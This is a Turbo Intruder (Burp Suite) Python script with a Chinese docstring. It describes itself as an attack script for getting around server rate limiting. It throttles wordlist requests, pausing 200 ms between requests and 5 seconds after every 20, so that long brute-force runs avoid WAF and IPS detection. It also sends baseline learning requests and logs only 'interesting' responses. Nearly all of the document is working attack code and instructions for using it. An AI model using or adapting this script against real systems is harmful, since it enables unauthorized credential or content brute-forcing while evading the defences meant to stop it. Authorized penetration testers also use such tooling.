"""
限流攻击脚本 - Turbo Intruder

功能说明：
这是一个专门设计用于绕过服务器限流机制的攻击脚本。
通过控制请求频率和批次间隔，避免触发目标服务器的速率限制。

作者：https://github.com/abiwaddell
详细说明：https://github.com/abiwaddell/Run-Pause-Resume

攻击策略：
1. 单个请求级别的节流控制
2. 批次请求间的暂停机制
3. 学习模式的基线建立
4. 智能响应过滤

使用场景：
- 目标有严格的速率限制
- 需要长时间持续攻击
- 避免被WAF或IPS检测
- 模拟正常用户行为
- 绕过基于频率的防护

参数配置：
- triedWords: 每批尝试的单词数（20个）
- timeMins: 批次间暂停分钟数（0分钟）
- timeSecs: 批次间暂停秒数（5秒）
- throttleMillisecs: 单个请求间隔（200毫秒）

工作流程：
1. 发送学习请求建立基线
2. 按配置的间隔发送攻击请求
3. 每批请求后暂停指定时间
4. 只记录有趣的响应

学习模式：
脚本首先发送随机字符串和基础输入作为学习样本，
帮助识别正常响应模式，提高攻击精度。

节流机制：
- 请求级节流：每个请求间等待200毫秒
- 批次级节流：每20个请求后暂停5秒
- 可根据目标调整参数

注意事项：
- 攻击时间会显著延长
- 需要根据目标调整参数
- 适合对抗严格的限流机制
- 可能需要长时间运行

使用方法：
1. 根据目标限流策略调整参数
2. 准备words.txt字典文件
3. 运行脚本进行缓慢攻击
4. 监控是否触发限流
"""

import time

# 配置参数
triedWords=20           # 每批尝试的单词数
timeMins=0              # 批次间暂停分钟数
timeSecs=5              # 批次间暂停秒数
throttleMillisecs=200   # 单个请求间隔（毫秒）

def queueRequests(target, wordlists):
    # 创建限流攻击引擎
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,        # 并发连接数
                           pipeline=False,                  # 禁用管道
                           engine=Engine.BURP               # 使用Burp引擎
                           )

    # 学习模式：发送随机字符串和基础输入建立基线
    for i in range(3, 8):
        engine.queue(target.req, randstr(i), learn=1)      # 随机字符串学习
        engine.queue(target.req, target.baseInput, learn=2) # 基础输入学习

    # 计算批次间暂停时间
    secs=timeMins*60+timeSecs
    n=0  # 请求计数器

    # 从字典文件读取单词进行限流攻击
    for word in open('words.txt'):
        time.sleep(throttleMillisecs/1000)  # 请求级节流
        engine.queue(target.req, word.rstrip())
        n+=1

        # 批次级节流：每triedWords个请求后暂停
        if(n==triedWords):
            time.sleep(secs)  # 批次间暂停
            n=0               # 重置计数器

def handleResponse(req, interesting):
    # 只记录有趣的响应，减少噪音
    if interesting:
        table.add(req)

    # 可以添加额外的过滤逻辑：
    # - 检查是否触发限流响应
    # - 监控响应时间变化
    # - 识别防护机制激活